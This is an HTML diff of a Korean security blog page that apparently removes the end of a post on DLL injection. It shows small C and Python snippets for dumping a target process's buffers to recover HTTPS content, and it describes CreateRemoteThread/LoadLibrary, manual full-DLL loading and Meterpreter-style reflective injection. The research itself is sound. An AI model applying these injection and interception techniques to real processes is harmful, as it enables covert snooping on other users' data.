-</span><span class='line'>    <span class="n">j</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">i</span><span class="p">];</span>
-</span><span class='line'>    <span class="n">wsprintfW</span><span class="p">((</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">line</span><span class="p">,</span> <span class="s">L&quot;%02X&quot;</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">OutputDebugString</span><span class="p">((</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="n">line</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="n">OutputDebugString</span><span class="p">(</span><span class="s">L&quot;End dump...&quot;</span><span class="p">);</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>귀찮아서 그냥 한바이트씩 출력하고,</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload&quot;</span><span class="p">,</span><span class="s">&quot;r&quot;</span><span class="p">)</span>
-</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span class='line'><span class="nb">hex</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
-</span><span class='line'><span class="k">print</span> <span class="nb">hex</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>로 HTTPS 내용을 출력했다.</p>
-
-<p>이 방식의 단점이라면, Process Explorer 등에 DLL 이 그대로 노출되는 것.</p>
-
-<h4>Full DLL</h4>
-
-<p>Target process 의 메모리에 DLL path 만 write 한다음에 CreateRemoteThread 로 LoadLibrary() 를 target 에 돌려서 DLL 을 끌어올리는 방식 말고, 아예 target process memory 에 DLL 사이즈만큼의 메모리를 확보해서, DLL 을 읽어서 집어넣어주고, 실행시키는 방법이 있다.</p>
-
-<h4>Reflective DLL Injection</h4>
-
-<p>Meterpreter 에서 사용하는 Reflective DLL Injection 도 좀 뒤져봐야겠다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/8">&larr; Older</a>
@@ -1653,6 +2043,10 @@ DLL 의 <code>DLL_PROCESS_ATTACH</code> 때 돌아가게 코드를 만들어 놓
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/01/11/cve-2013-2094-perf-swevent-enabled-revisited/">CVE-2013-2094: Perf_swevent_enabled Revisited</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
       </li>
     
@@ -1666,10 +2060,6 @@ DLL 의 <code>DLL_PROCESS_ATTACH</code> 때 돌아가게 코드를 만들어 놓
     
       <li class="post">
         <a href="/blog/2015/12/07/trustnone/">TRUSTNONE</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
       </li>
     
   </ul>
